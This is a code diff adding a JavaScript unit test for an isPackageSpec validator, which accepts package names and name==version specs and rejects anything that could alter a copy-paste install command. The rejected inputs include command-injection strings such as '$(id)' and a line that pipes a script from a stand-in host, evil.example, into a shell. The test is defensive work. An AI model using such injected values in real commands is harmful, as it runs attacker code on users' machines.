@@ -134,3 +134,13 @@ test("isPackageName refuses anything that could change the copy-paste command (#
     assert.equal(logic.isPackageName(name), false, JSON.stringify(name));
   }
 });
+
+test("isPackageSpec takes a name or name==version, and nothing that could change the command (#57)", () => {
+  for (const spec of ["numpy", "numpy==2.0.0", "Django==5.1.3", "torch==2.5.1+cpu", "foo==1.0.post1", "foo==1.0rc1"]) {
+    assert.equal(logic.isPackageSpec(spec), true, spec);
+  }
+  for (const spec of ["", "numpy==", "==1.0", "numpy==1.0==2", "numpy>=1.0", "numpy==1.0; curl x | sh", "numpy==$(id)",
+    "numpy==1.0 -t all", "numpy==1!2.0", "foo; curl https://evil.example/x | sh #", null, undefined]) {
+    assert.equal(logic.isPackageSpec(spec), false, JSON.stringify(spec));
+  }
+});
